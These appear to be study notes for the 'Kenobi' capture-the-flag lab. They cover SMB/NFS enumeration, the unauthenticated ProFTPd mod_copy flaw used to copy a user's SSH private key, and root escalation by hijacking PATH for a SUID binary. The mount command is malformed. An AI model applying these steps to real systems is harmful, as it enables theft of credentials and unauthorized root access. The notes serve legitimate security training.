# KENOBI

## SAMBA

* Windows interooperability suit of programs for linux and unix
* Allows the sharing of files, printers, etc
* Based on SMB, which was originally only for windows

This is used to enumerate shares:

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
```

Used to connect via smb

```bash
smbclient //<ip>/anonymous
```

Download recursively with SMB

```bash
smbget -R smb://<ip>/anonymous
```

From the nmap scan you find RPC (remote procedure call) running. You can use nmap access a network file system

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
```


## ProFtpd

* Open-source ftp server that works with unix and windows

After finding the mod_copy module with search sploit you know the following

```
The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
```

Since you know ftp is running you know that there is a generated ssh key

```bash
nc $IP 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

now mount to the kenobi file system

```bash
mkdir /mnt/kenobiNFS
mount $IP/var/mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

Now have network mount on your machine, you can get the ssh key and login

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@$IP
```

## Privilege Escalation with Path Variable Manipulation

* SUID Bit: User executes the file with permissions of the file owner -> can be used to escalate priviledge

To search the system for custom files that have SUID bit

```bash
find / -perm -u=s -type f 2>/dev/null
```
Use **strings** command to find human readable in binary, you find you can run curl as it runs without a full path, eg not using /usr/bin/curl

As this file runs with root, we can manipulate our path to gain root

```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

```
We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!
```
